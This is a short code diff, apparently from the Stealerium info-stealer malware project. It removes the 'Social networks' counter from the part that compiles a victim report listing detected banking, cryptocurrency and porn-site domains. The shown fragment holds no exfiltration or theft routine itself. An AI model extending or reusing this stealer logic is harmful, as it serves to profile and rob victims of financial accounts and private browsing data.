@@ -80,7 +80,6 @@ namespace Stealerium.Helpers
                                   "\n== Domains ==" +
                                   Counter.GetLValue("Banking services", Counter.DetectedBankingServices, '-') +
                                   Counter.GetLValue("Cryptocurrency services", Counter.DetectedCryptoServices, '-') +
-                                  Counter.GetLValue("Social networks", Counter.DetectedSocialServices, '-') +
                                   Counter.GetLValue("Porn websites", Counter.DetectedPornServices, '-') +
                                   "\n";
                     if (setpassword)
